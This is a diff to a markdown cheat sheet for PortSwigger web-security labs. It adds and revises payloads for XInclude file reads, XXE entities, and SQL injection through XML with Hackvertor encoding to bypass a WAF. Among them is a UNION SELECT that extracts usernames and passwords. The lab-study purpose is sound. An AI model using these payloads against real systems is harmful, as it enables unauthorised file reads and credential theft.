@@ -385,7 +385,7 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --
 
 >Possible to find XXE attack surface in requests that do not contain any XML.  
 
-<sub>Idnetify XXE in not so obvious parameters or requests by adding the below and URL encode thr **&** symbol.</sub>  
+<sub>Idnetify XXE in not so obvious parameters or requests by adding the below and URL encode the **&** symbol.</sub>  
 
 ```xml
 %26entity;
@@ -426,7 +426,7 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --
 
 ### Xinclude file read  
 
->Webapp **Check Stock** feature use server-side XML document that is parsed, but because the entire XML documentcannot be defined a DTD file cannot be used. Injecting an **XInclude** statement to retrieve the contents of /home/carlos/secret file is possible.  
+>Webapp **Check Stock** feature use server-side XML document that is parsed, but because the entire XML document, not possible to use a DTD file. Injecting an **XInclude** statement to retrieve the contents of /home/carlos/secret file instead.  
 
 ```xml
 <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///home/carlos/secret"/></foo>  
@@ -441,16 +441,29 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --
 
 >SQL injection with filter bypass via XML encoding may allow extract of sensitive data.  
 
-<sub>Use Burp extension hackvector to obfuscate the payload.</sub>  
+>Identify by using mathematical expresion such as **7x7**, and this indicate possible SQL injection or Template injections.
 
+![identify-math-evaluated-xml](identify-math-evaluated-xml.png)  
+
+>WAF detect attack when appending SQL query such as a UNION SELECT statement to the original store ID.  
+
+```sql
+<storeId>1 UNION SELECT NULL</storeId>
+```  
+
+>Bypass the WAF, Use Burp extension **Hackvertor** to obfuscate the SQL Injection payload in the XML post body. 
+
+![Web application firewall (WAF) bypass require obfuscate of malicious query with Hackvertor](hackvertor.png)  
+
+>Webapp return one column, thus need to concatenate the returned usernames and passwords columns from the users table.  
+ 
 ```xml
 <storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
 ```  
 
+!(SQL injection with filter bypass via XML encoding obfuscation)[xml+sql+obfuscation.png]
+
 [PortSwigger Lab: SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)  
-
-<sup> XML Section incomplete </sup>  
-
 
 ## SSRF - Server Side Request Forgery  
 
